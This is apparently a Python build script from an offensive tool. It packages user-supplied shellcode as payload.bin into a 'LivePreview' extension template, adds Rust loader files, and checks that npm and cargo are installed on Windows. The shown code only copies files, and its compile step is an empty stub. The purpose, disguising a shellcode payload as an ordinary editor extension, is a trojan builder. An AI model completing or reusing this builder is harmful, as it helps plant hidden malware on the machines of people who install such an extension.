"""
Contains the class responsible for building things
"""
import os
import sys
import shutil
from pathlib import Path
from tempfile import TemporaryDirectory

from src.extensions.livepreview import LivePreview

def copy_dir_contents(src, dst):
    src = Path(src)
    dst = Path(dst)

    dst.mkdir(parents=True, exist_ok=True)

    for item in src.iterdir():
        target = dst / item.name
        if item.is_dir():
            shutil.copytree(item, target, dirs_exist_ok=True)
        else:
            shutil.copy2(item, target)  # preserves metadata

class Generator:
    def __init__(self, ext, shellcode, enc):
        self.ext = None
        self.shellcode = shellcode
        # self.inflate = inflate 
        self.enc = enc
        self._tmp = TemporaryDirectory(delete=False)
        self.tmp = self._tmp.name
        # print("[+] Temporary build directory:\t\t"+self.tmp)

        _ext = ext.lower()
        if _ext == "livepreview":
            self.ext = LivePreview()

    def check_prerequisites(self):
        """Check files"""
        if os.name != 'nt':
            print("[-] This program can only be run on WINDOWS (for now)")

        _v = ["npm", "cargo"]
        for _p in _v:
            s = shutil.which(_p)
            if s:
                print(f"[+] {_p} found in:\t{s}")
            else:
                print(f"[-] Did not find required program:\t{_p}")
                sys.exit(-1)
    
        
    def template_files(self):
        """template files for compilation"""

        # First copy vs files into temp directory 
        copy_dir_contents(self.ext.template_path, self.tmp)
        print("[+] Template JS copied to:\t\t" + self.tmp) 

        # Copy shellcode file
        temp_shellcode = os.path.join(self.tmp, "src", "payload.bin")
        shutil.copyfile(self.shellcode, temp_shellcode)
        print("[+] Shellcode copied to:\t\t"+temp_shellcode) 


        # Copy rust files 
        rust_files = ["Cargo.toml", "Cargo.lock", os.path.join("src", "lib.rs")]
        for r in rust_files:
            _s = os.path.join(os.getcwd(), "templates", "rust", r)
            _d = os.path.join(self.tmp, r)
            shutil.copy2(_s, _d)
            print("[+] Copied rust files to:\t\t" + _d) 

    def compile(self):
        """Compile files"""
        cw = os.getcwd()
        try:
            os.chdir(self.tmp)

        except Exception as e:
            pass
        os.chdir(cw)
    